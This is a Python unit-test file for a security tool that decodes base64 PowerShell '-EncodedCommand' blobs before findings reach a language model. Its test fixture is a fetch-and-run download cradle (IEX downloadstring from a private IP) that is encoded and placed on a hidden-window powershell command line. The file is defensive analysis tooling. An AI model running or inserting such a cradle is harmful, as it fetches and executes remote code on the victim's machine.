#!/usr/bin/env python3
"""-EncodedCommand blobs are decoded by code before the model sees them: the model
decoding base64 itself named the wrong C2 address in 5 of 9 holdout reports."""
import base64
import os
import sys
import unittest

_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_HERE)
for _p in (_HERE, os.path.join(_ROOT, "modules/backend")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import _optional_deps  # noqa: F401,E402
from services.fusion.llm_sim import _decode_ps, _with_decoded  # noqa: E402

SCRIPT = "IEX (new-object net.webclient).downloadstring('http://10.0.10.106:8080/update.ps1')"
BLOB = base64.b64encode(SCRIPT.encode("utf-16-le")).decode()


class DecodePs(unittest.TestCase):
    def test_every_spelling_of_the_flag(self):
        for flag in ("-enc", "-EncodedCommand", "-ec", "-e", "-EnCoDeD"):
            out = _decode_ps(f"powershell.exe -w 1 {flag} {BLOB}")
            self.assertIn("decoded by Intact: " + SCRIPT, out, flag)
            self.assertNotIn(BLOB, out, flag)

    def test_not_a_flag_prefix_is_left_alone(self):
        s = f"tool.exe -eval {BLOB}"
        self.assertEqual(_decode_ps(s), s)

    def test_blob_cut_short_decodes_as_far_as_it_goes(self):
        out = _decode_ps(f"powershell -enc {BLOB[:-3]}")
        self.assertIn("blob cut short", out)
        self.assertIn("10.0.10.106", out)

    def test_base64_that_is_not_a_utf16_script_stays(self):
        junk = base64.b64encode(bytes(range(200, 256)) * 2).decode()
        s = f"powershell -enc {junk}"
        self.assertEqual(_decode_ps(s), s)

    def test_quoted_blob(self):
        self.assertIn(SCRIPT, _decode_ps(f'powershell -enc "{BLOB}"'))

    def test_walks_the_payload(self):
        p = {"findings": [{"evidence": [f"Command: powershell -enc {BLOB}"], "n": 3}], "ok": None}
        out = _with_decoded(p)
        self.assertIn(SCRIPT, out["findings"][0]["evidence"][0])
        self.assertEqual((out["findings"][0]["n"], out["ok"]), (3, None))
        self.assertIn(BLOB, p["findings"][0]["evidence"][0])      # the input is not changed

    def test_text_without_a_flag_is_returned_as_is(self):
        s = "no encoded command here"
        self.assertIs(_decode_ps(s), s)


if __name__ == "__main__":
    unittest.main()
